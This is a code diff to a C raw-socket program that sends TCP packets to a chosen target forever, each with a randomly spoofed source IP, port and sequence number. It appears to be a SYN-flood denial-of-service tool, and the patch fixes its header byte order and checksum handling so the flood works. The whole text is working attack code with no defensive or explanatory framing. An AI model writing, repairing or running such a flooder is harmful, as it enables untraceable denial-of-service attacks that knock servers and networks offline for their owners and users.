@@ -233,6 +233,13 @@ int main(int argc, char *argv[]) {
 		exit(1);
 	}
 
+	//IP_HDRINCL to tell the kernel that headers are included in the packet
+	int option_value = 1;
+	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
+		perror("Error setting IP_HDRINCL");
+		exit(1);
+	}
+
 	// Get target (and optionally source) IP address
 	char dst_addr[32];
 	uint16_t dst_port;
@@ -300,13 +307,13 @@ int main(int argc, char *argv[]) {
 
 	// Initialize headers
 	struct iphdr *iph = (struct iphdr *) datagram;
-	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
+	struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
 	uint8_t *opts = (uint8_t *)(tcph + 1);
-	struct pseudo_header psh;
+	// struct pseudo_header psh;
 
 	// TCP Payload
-	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + TCP_OPT_LEN;
-	strcpy(data, "");
+	// data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + TCP_OPT_LEN;
+	// strcpy(data, "");
 
 	// Address resolution
 	struct sockaddr_in sin;
@@ -318,8 +325,8 @@ int main(int argc, char *argv[]) {
 	iph->ihl = 5;
 	iph->version = 4;
 	iph->tos = 0;
-	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + TCP_OPT_LEN + strlen(data); //20 bytes of options
-	iph->id = htonl(0);	//Id of this packet, can be any value
+	iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + TCP_OPT_LEN);// + strlen(data); //20 bytes of options
+	iph->id = htons(0);	//Id of this packet, can be any value
 	iph->frag_off = htons(1 <<14);
 	iph->ttl = 64;
 	iph->protocol = IPPROTO_TCP;
@@ -372,46 +379,38 @@ int main(int argc, char *argv[]) {
 	*opts++ = 3;
 	*opts++ = 6; // 2^6 = 64, window size scale = 64
 
-	// TCP checksum
-	psh.source_address = inet_addr(default_src_addr);
-	psh.dest_address = sin.sin_addr.s_addr;
-	psh.placeholder = 0;
-	psh.protocol = IPPROTO_TCP;
-	psh.tcp_length = htons(sizeof(struct tcphdr) + TCP_OPT_LEN + strlen(data));
+	// // TCP checksum
+	// psh.source_address = inet_addr(default_src_addr);
+	// psh.dest_address = sin.sin_addr.s_addr;
+	// psh.placeholder = 0;
+	// psh.protocol = IPPROTO_TCP;
+	// psh.tcp_length = htons(sizeof(struct tcphdr) + TCP_OPT_LEN;// + strlen(data));
 
-	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + TCP_OPT_LEN + strlen(data);
-	pseudogram = malloc(psize);
+	// int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + TCP_OPT_LEN;// + strlen(data);
+	// pseudogram = malloc(psize);
 
-	memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
-	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + TCP_OPT_LEN + strlen(data));
+	// memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
+	// memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + TCP_OPT_LEN;// + strlen(data));
 
 	// tcph->check = csum((unsigned short*) pseudogram, psize);
-
-	//IP_HDRINCL to tell the kernel that headers are included in the packet
-	int option_value = 1;
-	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
-		perror("Error setting IP_HDRINCL");
-		exit(1);
-	}
 
 	// __be32 old_saddr;
 	// __be32 new_saddr;
 	// Generate packets forever, the caller must terminate this program manually
 	while(1) {
-
+		struct iphdr *iph = (struct iphdr *)datagram;
+        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
 		// Generate a new random source IP, excluding certain prefixes
 		// new_saddr = (__be32)(random_ipv4());
-
-		
-		iph->id = rand_next() & 0xffff;		
 		iph->saddr = (__be32)(random_ipv4());
-
-		iph->check = 0;
-		iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+		iph->id = rand_next() & 0xffff;		
 
 		// tcph->window = rand_next() & 0xffff;
 		tcph->source = rand_next() & 0xffff;
 		tcph->seq = rand_next() & 0xffff;
+
+		iph->check = 0;
+		iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 		tcph->check = 0;
 		tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + TCP_OPT_LEN), sizeof (struct tcphdr) + TCP_OPT_LEN);
 		
